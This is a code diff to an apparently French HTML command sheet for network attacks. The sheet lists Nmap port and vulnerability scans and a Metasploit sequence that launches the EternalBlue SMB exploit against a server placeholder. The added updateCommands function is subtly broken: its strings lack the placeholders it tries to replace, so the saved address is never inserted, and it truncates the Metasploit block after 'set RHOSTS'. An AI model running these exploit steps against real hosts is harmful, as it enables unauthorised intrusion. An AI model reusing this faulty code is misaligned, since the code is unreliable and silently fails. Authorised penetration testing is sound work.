@@ -62,7 +62,7 @@
         <!-- Section pour récupérer l'adresse IP de la passerelle -->
         <div class="input-section">
             <h2>Commande pour récupérer l'adresse IP de la passerelle</h2>
-            <pre>
+            <pre id="ipCommand">
                 ip route | grep default
             </pre>
         </div>
@@ -79,15 +79,15 @@
         <div class="commands-section">
             <h2>Commandes pour tester le réseau</h2>
             <p>Exécuter un scan Nmap :</p>
-            <pre>
+            <pre id="nmapCommand">
                 nmap -p 1-65535 -sV [adresse_ip_du_client]
             </pre>
             <p>Exécuter un scan des vulnérabilités :</p>
-            <pre>
+            <pre id="nmapVulnCommand">
                 nmap --script vuln [adresse_ip_du_client]
             </pre>
             <p>Exploitation via Metasploit :</p>
-            <pre>
+            <pre id="metasploitCommand">
                 msfconsole
                 use exploit/windows/smb/ms17_010_eternalblue
                 set RHOSTS [adresse_ip_du_serveur]
@@ -105,14 +105,33 @@
             const savedWord = localStorage.getItem('savedWord');
             if (savedWord) {
                 document.getElementById('savedWord').textContent = savedWord;
+                // Remplacer le mot dans les commandes par le mot sauvegardé
+                updateCommands(savedWord);
             }
         });
 
-        // Sauvegarder le mot dans localStorage
+        // Sauvegarder le mot dans localStorage et mettre à jour les commandes
         function saveWord() {
             const word = document.getElementById('wordInput').value;
             localStorage.setItem('savedWord', word);
             document.getElementById('savedWord').textContent = word;
+            updateCommands(word);  // Met à jour les commandes avec le mot sauvegardé
+        }
+
+        // Fonction pour mettre à jour les commandes avec le mot sauvegardé
+        function updateCommands(word) {
+            const commands = [
+                { id: 'ipCommand', command: 'ip route | grep default' },
+                { id: 'nmapCommand', command: 'nmap -p 1-65535 -sV ' },
+                { id: 'nmapVulnCommand', command: 'nmap --script vuln ' },
+                { id: 'metasploitCommand', command: 'msfconsole\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS ' }
+            ];
+
+            commands.forEach(function(command) {
+                const commandElement = document.getElementById(command.id);
+                let updatedCommand = command.command.replace('[adresse_ip_du_client]', word).replace('[adresse_ip_du_serveur]', word);
+                commandElement.textContent = updatedCommand;
+            });
         }
     </script>
 
